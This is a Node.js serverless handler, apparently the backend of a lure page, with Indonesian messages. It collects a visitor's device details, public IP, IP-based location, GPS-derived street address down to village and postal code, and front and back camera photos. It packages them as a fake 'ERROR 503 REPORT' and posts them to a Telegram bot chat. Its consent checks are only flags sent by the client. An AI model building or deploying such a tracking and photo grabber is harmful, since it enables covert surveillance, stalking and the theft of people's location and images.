export const config = {
    runtime: "nodejs"
};

const UNKNOWN = "Tidak tersedia";

function safe(value, fallback = UNKNOWN) {
    if (
        value === undefined ||
        value === null ||
        String(value).trim() === ""
    ) {
        return fallback;
    }

    return String(value).slice(0, 1000);
}


/* ================= FETCH JSON ================= */

async function fetchJSON(url) {

    const controller = new AbortController();

    const timer = setTimeout(
        () => controller.abort(),
        10000
    );

    try {

        const response = await fetch(url, {
            signal: controller.signal,
            headers: {
                Accept: "application/json"
            }
        });

        if (!response.ok) {
            throw new Error("HTTP " + response.status);
        }

        return await response.json();

    } finally {

        clearTimeout(timer);

    }

}


/* ================= PUBLIC IP ================= */

function getPublicIP(req) {

    const forwarded =
        req.headers["x-forwarded-for"];

    const ip = String(
        forwarded?.split(",")[0] ||
        req.headers["x-real-ip"] ||
        ""
    ).trim().replace(/^::ffff:/, "");

    if (
        !ip ||
        ip === "127.0.0.1" ||
        ip === "::1" ||
        /^10\./.test(ip) ||
        /^192\.168\./.test(ip) ||
        /^172\.(1[6-9]|2[0-9]|3[01])\./.test(ip)
    ) {
        return "Unknown";
    }

    return ip;

}


/* ================= IP INFORMATION ================= */

async function getIPInfo(ip) {

    const empty = {
        country:UNKNOWN,
        region:UNKNOWN,
        city:UNKNOWN,
        isp:UNKNOWN
    };

    if(ip === "Unknown"){
        return empty;
    }

    try{

        const data = await fetchJSON(
            `https://ipwho.is/${encodeURIComponent(ip)}`
        );

        if(data.success !== false){

            return {
                country:safe(data.country),
                region:safe(data.region),
                city:safe(data.city),
                isp:safe(
                    data.connection?.isp ||
                    data.connection?.org
                )
            };

        }

    }catch(error){

        console.log("IPWho error:",error.message);

    }

    try{

        const data = await fetchJSON(
            `https://ipapi.co/${encodeURIComponent(ip)}/json/`
        );

        if(!data.error){

            return {
                country:safe(data.country_name),
                region:safe(data.region),
                city:safe(data.city),
                isp:safe(data.org)
            };

        }

    }catch(error){

        console.log("IPAPI error:",error.message);

    }

    return empty;

}


/* ================= GPS ADDRESS ================= */

async function getGPSAddress(lat,lon){

    try{

        const url =
            "https://nominatim.openstreetmap.org/reverse" +
            `?format=jsonv2&lat=${lat}&lon=${lon}` +
            "&zoom=18&addressdetails=1";

        const data = await fetchJSON(url);

        return data.address || {};

    }catch(error){

        console.log("GPS error:",error.message);

        return {};

    }

}


/* ================= ADDRESS ================= */

function normalizeAddress(address,ipInfo){

    return {

        village:
            address.village ||
            address.suburb ||
            address.hamlet ||
            address.neighbourhood ||
            UNKNOWN,

        district:
            address.city_district ||
            address.subdistrict ||
            address.district ||
            address.county ||
            UNKNOWN,

        city:
            address.city ||
            address.town ||
            address.municipality ||
            address.regency ||
            UNKNOWN,

        province:
            address.state ||
            address.province ||
            ipInfo.region ||
            UNKNOWN,

        postal:
            address.postcode ||
            UNKNOWN,

        country:
            address.country ||
            ipInfo.country ||
            UNKNOWN

    };

}


/* ================= LOCATION QUALITY ================= */

function getLocationQuality(accuracy){

    const value = Number(accuracy);

    if(!Number.isFinite(value)){
        return "Tidak tersedia";
    }

    if(value <= 20) return "High ✅";

    if(value <= 100) return "Medium ⚠️";

    return "Low ❌";

}


/* ================= SEND TELEGRAM MESSAGE ================= */

async function sendTelegramMessage(token,chatId,text){

    const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
            method:"POST",

            headers:{
                "Content-Type":"application/json"
            },

            body:JSON.stringify({
                chat_id:chatId,
                text:text
            })
        }
    );

    const result = await response.json();

    if(!response.ok || !result.ok){

        throw new Error("Telegram message gagal");

    }

}


/* ================= SEND TELEGRAM PHOTO ================= */

async function sendTelegramPhoto(token,chatId,photo,caption){

    if(!photo){
        return;
    }

    if(
        typeof photo !== "string" ||
        !photo.startsWith("data:image/jpeg;base64,")
    ){

        throw new Error("Format foto tidak valid");

    }

    const base64 = photo.split(",")[1];

    const buffer = Buffer.from(base64,"base64");

    if(buffer.length > 2 * 1024 * 1024){

        throw new Error("Ukuran foto terlalu besar");

    }

    const form = new FormData();

    form.append("chat_id",chatId);

    form.append(
        "photo",
        new Blob([buffer],{
            type:"image/jpeg"
        }),
        "camera.jpg"
    );

    form.append("caption",caption);

    const response = await fetch(
        `https://api.telegram.org/bot${token}/sendPhoto`,
        {
            method:"POST",
            body:form
        }
    );

    const result = await response.json();

    if(!response.ok || !result.ok){

        throw new Error("Telegram gagal mengirim foto");

    }

}


/* ================= MAIN HANDLER ================= */

export default async function handler(req,res){

    if(req.method !== "POST"){

        return res.status(405).json({
            success:false,
            message:"Method Not Allowed"
        });

    }

    const BOT_TOKEN = process.env.BOT_TOKEN;

    const CHAT_ID = process.env.CHAT_ID;

    if(!BOT_TOKEN || !CHAT_ID){

        return res.status(500).json({
            success:false,
            message:"Environment variable belum diatur"
        });

    }

    const input = req.body || {};

    if(input.consent !== true){

        return res.status(403).json({
            success:false,
            message:"Persetujuan diperlukan"
        });

    }

    try{

        /* IP */

        const ip = getPublicIP(req);

        const ipInfo = await getIPInfo(ip);


        /* GPS */

        const lat = Number(input.latitude);

        const lon = Number(input.longitude);

        const validGPS =
            input.locationConsent === true &&
            Number.isFinite(lat) &&
            Number.isFinite(lon) &&
            lat >= -90 &&
            lat <= 90 &&
            lon >= -180 &&
            lon <= 180;

        let rawAddress = {};

        if(validGPS){

            rawAddress = await getGPSAddress(lat,lon);

        }

        const address = normalizeAddress(
            rawAddress,
            ipInfo
        );


        /* CAMERA */

        const frontCamera = safe(input.frontCamera);

        const backCamera = safe(input.backCamera);


        /* TIME */

        const timezone = safe(
            input.timezone,
            "Asia/Jakarta"
        );

        let time;

        try{

            time = new Date().toLocaleString(
                "sv-SE",
                {
                    timeZone:timezone
                }
            );

        }catch{

            time = new Date().toISOString();

        }


        /* MAPS */

        const maps = validGPS
            ? `https://www.google.com/maps?q=${lat},${lon}`
            : UNKNOWN;


        /* REPORT */

        const report = `
🚨 ERROR 503 REPORT

━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : ${safe(input.os)}
💻 Platform     : ${safe(input.platform)}
⚙️ CPU Cores    : ${safe(input.cpu)}
💾 RAM          : ${safe(input.ram)}
🖥 Resolution   : ${safe(input.resolution)}
🌐 Browser      :
${safe(input.browser)}

🕒 Timezone     : ${timezone}
🗣 Language     : ${safe(input.language)}
🌍 Public IP    : ${ip}

━━━━━━━━━━━━━━━━━━━━
🌎 IP INFORMATION
━━━━━━━━━━━━━━━━━━━━
🌍 Country     : ${ipInfo.country}
📍 Region      : ${ipInfo.region}
🏙 City        : ${ipInfo.city}
🏢 ISP / Org   : ${ipInfo.isp}

━━━━━━━━━━━━━━━━━━━━
🏠 ADDRESS INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏘 Village      : ${address.village}
🏙 District     : ${address.district}
🏛 City         : ${address.city}
🌆 Province     : ${address.province}
📮 Postal Code  : ${address.postal}
🌍 Country      : ${address.country}

━━━━━━━━━━━━━━━━━━━━
📐 LOCATION QUALITY
━━━━━━━━━━━━━━━━━━━━
🎯 Quality     : ${
    validGPS
        ? getLocationQuality(input.accuracy)
        : "Tidak diberikan izin GPS"
}
📡 Source      : ${
    validGPS ? "GPS" : "IP (Approximate)"
}

🗺 Google Maps:
${maps}

━━━━━━━━━━━━━━━━━━━━
📷 CAMERA INFORMATION
━━━━━━━━━━━━━━━━━━━━
🤳 Front Camera : ${frontCamera}
📸 Back Camera  : ${backCamera}

⏰ Time : ${time}
`;

        /* SEND REPORT */

        await sendTelegramMessage(
            BOT_TOKEN,
            CHAT_ID,
            report
        );


        /* SEND CONFIRMED PHOTOS */

        if(input.frontPhoto){

            await sendTelegramPhoto(
                BOT_TOKEN,
                CHAT_ID,
                input.frontPhoto,
                "🤳 Foto Kamera Depan - dikonfirmasi pengguna"
            );

        }

        if(input.backPhoto){

            await sendTelegramPhoto(
                BOT_TOKEN,
                CHAT_ID,
                input.backPhoto,
                "📸 Foto Kamera Belakang - dikonfirmasi pengguna"
            );

        }


        return res.status(200).json({

            success:true,

            message:"Laporan berhasil dikirim"

        });


    }catch(error){

        console.error(error);

        return res.status(500).json({

            success:false,

            message:error.message || "Gagal mengirim laporan"

        });

    }

                                             }
